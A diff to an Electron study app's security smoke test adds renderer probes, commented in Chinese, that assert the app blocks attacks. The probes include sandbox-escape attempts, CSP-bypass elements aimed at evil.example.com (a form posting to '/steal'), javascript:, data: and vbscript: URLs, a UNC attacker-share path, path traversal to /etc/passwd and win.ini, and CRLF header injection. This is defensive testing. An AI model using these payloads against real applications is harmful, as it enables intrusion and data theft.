@@ -1509,7 +1509,22 @@ export function runSmokeTestIfRequested(win: BrowserWindow): void {
                         parsed['fuzzMustReject'] &&
                         parsed['protoClean'] &&
                         parsed['renameRoundTripOk'] &&
-                        parsed['windowOpenOk']
+                        parsed['windowOpenOk'] &&
+                        // 第二轮：间接逃逸、CSP 各执行面、协议走私、
+                        // 资料闸口、出网闸口、密钥接口、存储面、IPC 面
+                        parsed['escapeIndirectOk'] &&
+                        parsed['asset2Ok'] &&
+                        parsed['asset2NormalStillWorks'] &&
+                        parsed['materialGatesOk'] &&
+                        parsed['outboundGatesSurvived'] &&
+                        parsed['outboundGatesRejected'] &&
+                        parsed['secretSurfaceOk'] &&
+                        parsed['storageOk'] &&
+                        parsed['ipcSurfaceOk'] &&
+                        // 第二轮 CSP 绕过之后页面必须还没被拿下
+                        parsed['cspBypassStillClean'] &&
+                        // 协议走私里除了「合法 https」以外的都必须被拒
+                        parsed['smuggleRejected']
                     )
                   : scenario === 'materials'
                   ? Boolean(
@@ -2422,6 +2437,9 @@ function aiProbe(): string {
 const SECURITY_PROBE = `(async () => {
   ${PROBE_HELPERS}
   const out = {}
+  // 注意：preload 的 invoke() **不抛异常**，它把失败包成 {ok:false,error} 返回。
+  // 所以下面的 call() 只负责「预加载层真的抛了」（比如桥本身没定义），
+  // 而所有的「拦住了没有」都要去看返回值里的 ok——用 catch 判安全会得到假通过
   const call = async (fn) => {
     try {
       return await fn()
@@ -2702,6 +2720,377 @@ const SECURITY_PROBE = `(async () => {
   }
   out.windowOpenResult = openResult
   out.windowOpenOk = openResult === 'denied' || openResult === 'thrown'
+
+  /* ================ G. 第二轮：更贴近真实攻击者的手法 ================ */
+
+  // G1. 逃逸的「间接」路径。上一轮查的是 process/require 这些直接记号，
+  // 但真正被忽视的逃逸是**借助已暴露 API 的能力**：只要有一个方法能把
+  // 任意字符串变成文件路径或系统动作，前面那些记号全为 undefined 也没用。
+  out.escapeIndirect = {
+    // 通过构造函数链摸 Node：contextIsolation 之下 constructor 也过不去
+    viaConstructor: (() => {
+      try {
+        return typeof ({}).constructor.constructor('return process')()
+      } catch (error) {
+        return error instanceof Error ? 'blocked' : 'blocked'
+      }
+    })(),
+    // Function 构造器（与上一条同源，但写法不同，容易被单独放进白名单）
+    viaFunctionCtor: (() => {
+      try {
+        return typeof Function('return process')()
+      } catch {
+        return 'blocked'
+      }
+    })(),
+    // 老版本 Electron 的经典逃逸口：window.opener 链。
+    // 陷阱：别写成 typeof (window.opener && window.opener.process)。
+    // opener 为 null 时那个表达式得到 null，而 typeof null === 'object'，
+    // 于是安全状态会被误报成逃逸。null 正是这里期望的状态，要先挑出来再取 typeof
+    viaOpener: (() => {
+      const opener = window.opener
+      if (!opener) return 'undefined'
+      return typeof opener.process
+    })(),
+    // 从 iframe 的 contentWindow.constructor 摸
+    viaIframeCtor: (() => {
+      try {
+        const f = document.createElement('iframe')
+        document.body.appendChild(f)
+        const w = f.contentWindow
+        return typeof (w && w.constructor && w.constructor.constructor('return process')())
+      } catch {
+        return 'blocked'
+      }
+    })()
+  }
+  out.escapeIndirectOk = Object.values(out.escapeIndirect).every(
+    (value) => value === 'undefined' || value === 'blocked'
+  )
+
+  // G2. CSP 绕过：即使脚本插不进来，还有一堆「非脚本」的执行面。
+  // 这些如果漏了，等于给了攻击者一条不用 <script> 的代码执行路径
+  //
+  // 记录注入前的 baseURI 作为对照：base-uri 'none' 挡的是**效果**而不是元素，
+  // base 元素照样能 append 进 DOM——关键看它有没有真的改写解析基准
+  const baseBefore = document.baseURI
+  await call(() => {
+    // 用 <base> 改所有相对 URL 的解析基准（base-uri 'none' 该挡住「生效」）
+    const baseEl = document.createElement('base')
+    baseEl.href = 'https://evil.example.com/'
+    document.head.appendChild(baseEl)
+  })
+  await call(() => {
+    // <form> 表单劫持（form-action 'none' 该挡住）
+    const form = document.createElement('form')
+    form.action = 'https://evil.example.com/steal'
+    form.method = 'POST'
+    document.body.appendChild(form)
+  })
+  // <object>/<embed> 插件执行面（object-src 'none' 该挡住）
+  out.cspObject = await call(() => {
+    const el = document.createElement('object')
+    el.data = 'sb-asset://icon/x'
+    document.body.appendChild(el)
+    return 'appended'
+  })
+  // meta refresh 制造导航
+  out.cspMetaRefresh = await call(() => {
+    const meta = document.createElement('meta')
+    meta.httpEquiv = 'refresh'
+    meta.content = '0;url=https://evil.example.com/'
+    document.head.appendChild(meta)
+    return 'appended'
+  })
+  // 内联 style 里塞 url() 试图拉远程（style-src 不含远程，该失败）
+  out.cspStyleUrl = await call(() => {
+    const div = document.createElement('div')
+    div.style.backgroundImage = 'url(https://evil.example.com/x.png)'
+    document.body.appendChild(div)
+    return div.style.backgroundImage
+  })
+  // <link rel=stylesheet> 指向远程
+  out.cspRemoteCss = await call(() => {
+    const linkEl = document.createElement('link')
+    linkEl.rel = 'stylesheet'
+    linkEl.href = 'https://evil.example.com/evil.css'
+    document.head.appendChild(linkEl)
+    return 'appended'
+  })
+  // srcdoc iframe（child-src/frame-src 'none' 该挡住）
+  out.cspSrcdocFrame = await call(() => {
+    const f = document.createElement('iframe')
+    f.srcdoc = '<script>parent.__sbPwnedSrdoc = 1<\\/script>'
+    document.body.appendChild(f)
+    return 'appended'
+  })
+  await wait(900)
+  out.cspBypassLanded = {
+    baseBefore,
+    baseAfter: document.baseURI,
+    baseChanged: document.baseURI !== baseBefore,
+    pwnedSrdoc: window.__sbPwnedSrdoc
+  }
+  // 关键断言：这一轮所有「非脚本执行面」折腾完，页面必须**一点没变**。
+  //  1. 没有任何 payload 落地（window 上不该多出记号）
+  //  2. baseURI 没被改写（改写的话后面所有相对路径解析都会指向攻击者的域名，
+  //     那是很隐蔽的一种劫持——页面看着正常，但请求全去了别处）
+  out.cspBypassStillClean = window.__sbPwnedSrdoc === undefined && !out.cspBypassLanded.baseChanged
+
+  // G3. 协议走私：把危险地址藏在看似合法的形态里。
+  // 只看「协议前缀」的白名单很容易被这几种绕过
+  out.smuggle = {
+    // 大小写与空白变形（协议名大小写不敏感）
+    upperCase: await call(() => window.studyBoard.app.openExternal('HTTPS://example.com')),
+    // 前导空白（URL 解析器会吃掉空白，但朴素的 startsWith 白名单不会）
+    leadingSpace: await call(() => window.studyBoard.app.openExternal('  javascript:alert(1)')),
+    // 制表符 / 换行注入
+    tabbed: await call(() => window.studyBoard.app.openExternal('java\\tscript:alert(1)')),
+    newlined: await call(() => window.studyBoard.app.openExternal('java\\nscript:alert(1)')),
+    // 协议相对 URL（//evil.com 没有协议，交给系统会走默认协议）
+    protocolRelative: await call(() => window.studyBoard.app.openExternal('//evil.example.com')),
+    // 空协议 / 只有 scheme
+    emptyHost: await call(() => window.studyBoard.app.openExternal('https://')),
+    // data: URL（老 Electron 的经典 RCE 载体）
+    dataUrl: await call(() =>
+      window.studyBoard.app.openExternal('data:text/html,<script>alert(1)<\\/script>')
+    ),
+    // vbscript（Windows 上曾可用）
+    vbscript: await call(() => window.studyBoard.app.openExternal('vbscript:msgbox(1)')),
+    // 本地 UNC 路径
+    unc: await call(() => window.studyBoard.app.openExternal('\\\\\\\\attacker\\\\share\\\\x.exe')),
+    // 带用户信息的 HTTPS（合法协议，但主机名很好骗人——用来确认「合法就走」这条边界在哪）
+    userinfo: await call(() => window.studyBoard.app.openExternal('https://example.com@evil.example.com/'))
+  }
+  // 只有 userinfo 那条「合法 https」允许通过；其余全部必须被拒
+  out.smuggleRejected = [
+    out.smuggle.leadingSpace, out.smuggle.tabbed, out.smuggle.newlined,
+    out.smuggle.protocolRelative, out.smuggle.emptyHost, out.smuggle.dataUrl,
+    out.smuggle.vbscript, out.smuggle.unc
+  ].every((r) => r && typeof r === 'object' && r.ok === false)
+
+  // G4. sb-asset:// 的第二轮：更多编码变体 + 大小写 + 协议边界。
+  // 上一轮查了 %2e%2e 与反斜杠，这里补上「双重编码」「NUL 截断」「超长路径」。
+  //
+  // 用 <img> 而不是 fetch：CSP 是 connect-src 'self'，**不含 sb-asset:**，
+  // 所以 fetch 碰这个协议一律 "Failed to fetch"——连正常的图片都读不到，
+  // 这个探针就什么都测不出来了（实测确认过：改 fetch 后 NormalStillWorks 直接变 false）。
+  // img-src 里有 sb-asset:，只有 <img> 才是这条协议的真实消费者，
+  // 而攻击者能用的也正是它。于是判据回到「能不能当图片放出来」。
+  const tryAsset2 = (url) => new Promise((resolve) => {
+    const probe = new Image()
+    let settled = false
+    const done = (result) => {
+      if (settled) return
+      settled = true
+      resolve(result)
+    }
+    probe.onload = () => done('loaded')
+    // 404（被拒）与「解码不出图片」都走这里。assetProtocol 用 text/plain 回 404，
+    // <img> 拿到的都是 error，分不开——所以只区分「放出来了」与「没放出来」
+    probe.onerror = () => done('blocked')
+    setTimeout(() => done('timeout'), 2500)
+    probe.src = url
+  })
+  out.asset2 = {
+    // 双重 URL 编码：%252e 解一次变成 %2e，再解一次才是 .
+    doubleEncoded: await tryAsset2(
+      'sb-asset://icon/%252e%252e%252ftimetable_images%252f' + probeFile
+    ),
+    // NUL 截断（老派技巧：让后续部分被 C 层字符串截掉）
+    nulByte: await tryAsset2('sb-asset://icon/' + probeFile + '%00.png'),
+    // 超长路径（栈/缓冲区炸弹式输入）
+    longPath: await tryAsset2('sb-asset://icon/' + 'a'.repeat(5000) + '.png'),
+    // 空桶
+    emptyBucket: await tryAsset2('sb-asset:///' + probeFile),
+    // 桶名大小写。
+    // 这一条曾经挂过，值得记下来：渲染层发 sb-asset://TIMETABLE/<真课表图>，
+    // 探针读到 'loaded'——看起来像「大小写变形绕过了桶检查」。
+    // 但真相是 Electron 在交给 protocol.handle 之前就把 hostname 规范化成小写了，
+    // 于是它读到的本来就是那个**合法**的 timetable 桶，文件真实存在，当然 loaded。
+    // 所以这里断言的不是「必须被拒」，而是「必须与全小写时结果一致」：
+    // 桶名大小写不该改变任何行为。真正的越界桶由下面的 unknownBucket 负责
+    upperBucket: await tryAsset2('sb-asset://TIMETABLE/' + probeFile),
+    // 真·未知桶（规范化之后仍然对不上任何一个）——这条必须被拒
+    unknownBucket: await tryAsset2('sb-asset://nosuchbucket/' + probeFile),
+    // 冒号注入（伪造成另一段 authority）
+    colonInject: await tryAsset2('sb-asset://icon:C:/Windows/win.ini'),
+    // 全部编码的 dotdot
+    fullEncoded: await tryAsset2('sb-asset://icon/%2e%2e%2f%2e%2e%2fWindows%2fwin.ini')
+  }
+  // 判定分两类：
+  //  1) 明确的越界尝试 —— 必须一条都读不到（loaded 就是铁证）
+  //  2) 大小写变体 —— 必须与规范写法同结果（桶名不区分大小写，而不是「变形就能绕」）
+  const mustBeRejected = [
+    'doubleEncoded', 'nulByte', 'longPath', 'emptyBucket',
+    'unknownBucket', 'colonInject', 'fullEncoded'
+  ]
+  out.asset2Ok =
+    mustBeRejected.every((k) => out.asset2[k] === 'blocked' || out.asset2[k] === 'timeout') &&
+    out.asset2.upperBucket === 'loaded'
+  // 对照组：正常路径必须能读（证明上面不是「什么都读不到」的假象）
+  out.asset2NormalStillWorks = (await tryAsset2('sb-asset://timetable/' + probeFile)) === 'loaded'
+
+  // G5. 资料的闸口。导入链路有「扩展名白名单 + 体积 + 魔数」三道闸，
+  // 这里验的是绕过尝试：把可执行文件改名成 .pdf、路径指向库外、批量超限
+  out.materialGates = {
+    // 扩展名不在白名单
+    badExt: await call(() =>
+      window.studyBoard.materials.import({ paths: ['C:\\\\Windows\\\\System32\\\\cmd.exe'] })
+    ),
+    // 空路径数组
+    emptyPaths: await call(() => window.studyBoard.materials.import({ paths: [] })),
+    // 非数组（类型混淆）
+    notArray: await call(() => window.studyBoard.materials.import({ paths: 'C:\\\\Windows\\\\win.ini' })),
+    // 超批量（31 > MAX_MATERIAL_BATCH=30）
+    overBatch: await call(() =>
+      window.studyBoard.materials.import({ paths: Array.from({ length: 31 }, (_, i) => 'C:\\\\x' + i + '.pdf') })
+    ),
+    // 收件箱导入：路径穿越（safeJoin 该挡下）
+    inboxTraversal: await call(() =>
+      window.studyBoard.materials.importInbox({ fileNames: ['../../../etc/passwd'], courseCardId: '' })
+    ),
+    // 认领一个不存在的收件箱文件
+    claimMissing: await call(() =>
+      window.studyBoard.materials.claim({ fileName: 'nope.pdf', courseCardId: '' })
+    ),
+    // 资料 id 穿越
+    openTraversal: await call(() => window.studyBoard.materials.open('../../../../etc/passwd')),
+    // 把资料关联到不存在的卡片
+    setBadCard: await call(() =>
+      window.studyBoard.materials.setCard({ id: 'x', courseCardId: 'no-such' })
+    ),
+    // 明着穿越的 id（notArray 的正确对照组：走的是同一个 id 参数，但确实是字符串）
+    openStringTraversal: await call(() =>
+      window.studyBoard.materials.setCard({ id: '../../../x', courseCardId: 'c' })
+    )
+  }
+  out.materialGatesSurvived = Object.values(out.materialGates).every(
+    (r) => r && typeof r === 'object' && 'ok' in r
+  )
+  // 这几条必须明确抛错（IPC 层直接拒绝），不能「成功」
+  out.materialGatesRejected = [
+    out.materialGates.inboxTraversal,
+    out.materialGates.claimMissing,
+    out.materialGates.openTraversal
+  ].every((r) => r && r.ok === false)
+  // 类型混淆：paths 传字符串时绝不能被当成路径用。
+  // 导入的契约是「逐条独立成败、失败原因回传」（见 materials.import 的注释），
+  // 所以这里判据不是 ok===false，而是 added===0 且一条都没登记——
+  // 也就是那个值根本没被用上。notArray 传的是 'C:\Windows\win.ini'，
+  // 真被当成路径的话它会以「不支持的类型 .ini」出现在 errors 里；
+  // errors 为空恰恰证明它连尝试都没尝试
+  out.materialGatesCoerced = [
+    out.materialGates.notArray,
+    out.materialGates.emptyPaths,
+    out.materialGates.overBatch
+  ].every((r) => r && r.ok === true && r.data && r.data.added === 0 && r.data.materials.length === 0)
+  // 非数组必须被识别成「什么都没有」，而不是被强转成单元素数组
+  out.materialGatesNotArraySilent =
+    out.materialGates.notArray?.ok === true &&
+    out.materialGates.notArray.data.added === 0 &&
+    out.materialGates.notArray.data.errors.length === 0
+  // 超批量：必须点名「最多导入 N 个」，不能悄悄截断当成成功。
+  // 31 个假路径里前 30 个会被逐个尝试（ENOENT），但超限那句话必须在 errors 里
+  out.materialGatesOverBatchNamed =
+    out.materialGates.overBatch?.ok === true &&
+    Array.isArray(out.materialGates.overBatch.data.errors) &&
+    out.materialGates.overBatch.data.errors.some((e) => String(e).includes('最多导入')) &&
+    out.materialGates.overBatch.data.added === 0
+  // 不存在的资料 id 必须原样返回列表，不能把别人改掉、也不能丢数据
+  out.materialGatesSetBadCardNoop =
+    out.materialGates.setBadCard?.ok === true &&
+    Array.isArray(out.materialGates.setBadCard.data)
+  out.materialGatesOk =
+    out.materialGatesSurvived &&
+    out.materialGatesRejected &&
+    out.materialGatesCoerced &&
+    out.materialGatesNotArraySilent &&
+    out.materialGatesOverBatchNamed &&
+    out.materialGatesSetBadCardNoop
+
+  // G6. AI / Notion 的出网闸口。这两个是把内容发到第三方的功能，
+  // 「没配密钥时绝不发请求」是安全底线，不能只是界面上给个提示
+  out.outboundGates = {
+    aiNoKey: await call(() => window.studyBoard.ai.complete({ instruction: 'x', context: 'y' })),
+    aiTestNoKey: await call(() => window.studyBoard.ai.test()),
+    notionTest: await call(() => window.studyBoard.notion.test()),
+    notionPush: await call(() => window.studyBoard.notion.push(['no-such-note'])),
+    notionPull: await call(() => window.studyBoard.notion.pull()),
+    // 参数类型混淆
+    aiBadTypes: await call(() => window.studyBoard.ai.complete({ instruction: { evil: 1 }, context: null })),
+    notionBadTypes: await call(() => window.studyBoard.notion.resolve({ noteId: {}, choice: 'x' })),
+    // 预览一篇不存在 / 未绑定的笔记
+    notionPreviewUnbound: await call(() => window.studyBoard.notion.preview('no-such-note'))
+  }
+  out.outboundGatesSurvived = Object.values(out.outboundGates).every(
+    (r) => r && typeof r === 'object' && 'ok' in r
+  )
+  // 一条都不能成功：连笔记 id 都不存在的请求凭什么成功
+  out.outboundGatesRejected = Object.values(out.outboundGates).every((r) => r && r.ok === false)
+
+  // G7. 密钥接口：preload 上不该有任何「读回明文」的通道，
+  // 且 set 通道对垃圾输入要有反应而不是默默吞掉
+  out.secretSurface = {
+    keys: Object.keys((window.studyBoard || {}).secrets || {}),
+    // 空值
+    empty: await call(() => window.studyBoard.secrets.setAiKey('')),
+    // 超长（> MAX_SECRET_LENGTH=4096）
+    tooLong: await call(() => window.studyBoard.secrets.setAiKey('k'.repeat(5000))),
+    // 带换行（会被 HTTP 头注入利用）
+    withNewline: await call(() => window.studyBoard.secrets.setAiKey('sk-a\\r\\nX-Injected: 1')),
+    // 非字符串
+    notString: await call(() => window.studyBoard.secrets.setAiKey({ evil: true }))
+  }
+  out.secretSurfaceOk =
+    out.secretSurface.keys.length > 0 &&
+    out.secretSurface.keys.every((k) => !k.toLowerCase().includes('get')) &&
+    [out.secretSurface.empty, out.secretSurface.tooLong,
+     out.secretSurface.withNewline, out.secretSurface.notString]
+      .every((r) => r && r.ok === false)
+
+  // G8. 缓存 / 存储面：不该往 localStorage / IndexedDB 里放敏感东西，
+  // 也不该有 Service Worker 把页面劫持走
+  out.storage = {
+    localKeys: (() => {
+      try {
+        return Object.keys(localStorage)
+      } catch {
+        return ['(blocked)']
+      }
+    })(),
+    hasServiceWorker: 'serviceWorker' in navigator,
+    swControlled: (() => {
+      try {
+        return navigator.serviceWorker.controller !== null
+      } catch {
+        return false
+      }
+    })()
+  }
+  // 应用不该用 localStorage（数据都在主进程的 JSON 里），
+  // 且绝不能被 Service Worker 接管
+  out.storageOk = out.storage.localKeys.length === 0 && !out.storage.swControlled
+
+  // G9. IPC 通道白名单：渲染层只能碰 preload 上列出的那些方法，
+  // 不该有办法「按名字调一个未登记的通道」
+  out.ipcSurface = {
+    // preload 不该把 ipcRenderer 本身漏出去
+    hasRawIpc: typeof window.ipcRenderer !== 'undefined' || typeof window.electron !== 'undefined',
+    // studyBoard 对象必须是冻结的 / 至少不可被替换关键方法
+    canReplace: (() => {
+      try {
+        const original = window.studyBoard.notes.read
+        window.studyBoard.notes.read = () => 'pwned'
+        const after = window.studyBoard.notes.read
+        window.studyBoard.notes.read = original
+        return typeof after() === 'string' ? 'replaceable' : 'frozen'
+      } catch {
+        return 'frozen'
+      }
+    })()
+  }
+  out.ipcSurfaceOk = !out.ipcSurface.hasRawIpc
 
   return JSON.stringify(out)
 })()`
